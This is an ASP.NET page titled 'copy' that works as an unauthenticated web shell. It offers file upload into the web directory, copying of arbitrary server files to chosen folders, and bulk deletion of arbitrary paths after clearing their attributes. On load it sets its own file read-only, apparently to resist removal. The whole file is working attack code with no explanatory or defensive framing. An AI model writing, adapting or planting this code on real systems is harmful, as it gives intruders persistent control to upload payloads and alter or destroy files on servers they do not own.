<%@ Page Language="C#" %>

<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            string path0 = Request.PhysicalPath;
            System.IO.FileAttributes attrs = System.IO.File.GetAttributes(path0);
            System.IO.File.SetAttributes(path0, attrs | System.IO.FileAttributes.ReadOnly);

            if (Request.QueryString["type"] != null)
            {
                if (Request.QueryString["type"] == "333")
                {
                    string paths = Request.Form["textfield"];
                    string[] pathss = paths.Replace("\r\n", "|").Split('|');
                    string str = Request.Form["textfield2"];

                    foreach (string path in pathss)
                    {
                        string lastname = path.Split('\\')[path.Split('\\').Length - 1];
                        int cg = 0;
                        if (File.Exists(path))
                        {
                            string[] ssssss = str.Replace("\r\n", "|").Split('|');
                            foreach (string s in ssssss)
                            {
                                if (Directory.Exists(s))
                                {
                                    try
                                    {
                                        File.Copy(path, s + "\\" + lastname, true);
                                        cg++;
                                    }
                                    catch
                                    {


                                    }
                                }
                            }
                        }
                        Response.Write(cg);
                    }
                    
                }
                
                else if (Request.QueryString["type"] == "444")
                {
                    string Error_pth2 =null;
                    int cg = 0;
                    string str = Request.Form["textfield2"];
                    string[] ssssss = str.Replace("\r\n", "|").Split('|');
                    foreach (string s in ssssss)
                    {
                        if (s != string.Empty)
                        {
                            try
                            {
                                File.SetAttributes(s, FileAttributes.Normal);
                                File.Delete(s);

                                cg++;
                            }
                            catch (Exception ex)
                            {
                                Error_pth2 = Error_pth2 + "\n" + s + " ====> " + ex.Message;
                            }
                        }

                    }
                    textfield2.InnerText = "[+] Total Success: " + cg + "\n=====================\n\n[!] Errors: \n============" + Error_pth2;
                }
            }
        }
    }

    public string action = "";
    public string jg = "";
    public string getstr(string path)
    {
        string ru = "";
        if (Directory.Exists(path))
        {

            string[] aa = Directory.GetDirectories(path);
            int sz = 0;

            foreach (string item in aa)
            {
                sz++;
                ru += "<input class='kk' type='checkbox' name='c" + sz + "' value='" + (item) + "' >   <a href='?p=" + (item) + "'>" + item + "</a>" + "<br>";
            }
            string[] fs = Directory.GetFiles(path);
            foreach (string item in fs)
            {
                sz++;
                ru += "<input  class='kk' type='checkbox' name='c" + sz + "' value='" + (item) + "'  >" + item + "<br>";
            }

        }
        return ru;
    }
    public string wjj = "";


    protected void btnGonder_Click(object sender, EventArgs e)
    {
        if (uplDosya.HasFile)
        {
        uplDosya.SaveAs(Server.MapPath(".") + "\\" + uplDosya.FileName);
        }
        else
        Response.Write("yo yok");
    }

</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

    <title>copy</title>



</head>

<body>

    <h3>UPLOAD FILE</h3>

    <form id="form1" runat="server">
    <div>
    <asp:FileUpload ID="uplDosya" runat="server" />
    <br />
    <asp:Button ID="bntGonder" runat="server" Text="ok" OnClick="btnGonder_Click" />
    </div>
    </form>

    <h3>COPY AND DEL</h3>
    <form id="form1" name="form1" method="post" action="?type=333">
        <table width="100%" border="1">
            <tr>
                <td width="32%" height="20">
                    <label>
                        <div align="right">origin file:</div>
                    </label>
                </td>
                <td width="68%">
                    <label>
                        <textarea name="textfield" cols="100" rows="10"></textarea>
                    </label>
                </td>
            </tr>
            <tr>
                <td>
                    <div align="right">copy file:</div>
                </td>
                <td>
                    <textarea name="textfield2" cols="100" rows="30" ></textarea></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td>
                    <label>
                        <input type="submit" name="Submit" value="submit" />
                    </label>
                </td>
            </tr>
        </table>
    </form>
    <form id="form2" name="form2" method="post" action="?type=444">
        <table width="100%" border="1">

            <tr>
                <td>
                    <div align="right">del file:</div>
                </td>
                <td>
                    <textarea name="textfield2" id="textfield2" cols="100" rows="30" runat="server"></textarea></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td>
                    <label>
                        <input type="submit" name="Submit" value="submit" />
                    </label>
                </td>
            </tr>
        </table>
    </form>
</body>
</html>
